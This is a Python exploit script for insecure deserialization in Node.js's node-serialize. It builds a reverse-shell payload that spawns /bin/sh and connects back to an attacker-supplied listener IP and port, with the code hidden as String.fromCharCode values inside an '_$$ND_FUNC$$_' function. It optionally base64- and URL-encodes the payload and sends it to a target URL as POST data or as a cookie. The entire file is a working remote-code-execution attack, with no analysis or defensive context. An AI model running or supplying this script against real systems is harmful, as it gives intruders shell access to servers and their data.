import requests
import sys
import base64
import urllib.parse  # Import the urllib.parse module


if len(sys.argv) < 5:
    print("python3 nodejs-json-serializer-exploit.py <LISTENER_IP> <LISTENER_PORT> <DATA_NAME_TO_SEND> <TARGET_URL_TO_SEND> <OPTINIAL_SET_COOKIES (y/n)> <OPTIONAL_BASE64_ENCODE_DATA (y/n)>")
else:

    local_ip = sys.argv[1]
    local_port = sys.argv[2]

    data_name = sys.argv[3]
    target_url = sys.argv[4]


    cookies = sys.argv[5]
    base64_c = sys.argv[6]


    listOfCharCodes = []

    rev_shell = """(function(){ var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); var client = new net.Socket(); client.connect(%s, "%s", function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/;})();"""%(str(local_port),str(local_ip))

    for char in rev_shell:
        listOfCharCodes.append(ord(char))

    listOfCharCodes = str(listOfCharCodes)[:-1]
    listOfCharCodes = listOfCharCodes[1:]

    RCE_JSONData = '{"%s":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}'%(data_name,listOfCharCodes)

    URL = target_url

    if cookies.lower() != "y":
        if base64_c.lower() == "y":  # Corrected the function call here
            RCE_JSONData = base64.b64encode(RCE_JSONData.encode()).decode()  # Encode and decode for correct string conversion
        
        RCE_JSONData = urllib.parse.quote(RCE_JSONData)
        r = requests.post(URL, data=RCE_JSONData)
        print("Sent the data")
        print(r.text)

    if cookies.lower() == "y":
        if base64_c.lower() == "y":  # Corrected the function call here
            RCE_JSONData = base64.b64encode(RCE_JSONData.encode()).decode()  # Encode and decode for correct string conversion
        RCE_JSONData = urllib.parse.quote(RCE_JSONData)
        print(RCE_JSONData)
        r = requests.get(URL, cookies={data_name: RCE_JSONData})  # Set cookies correctly
        print("Sent the data as cookie")
        #print(r.text)




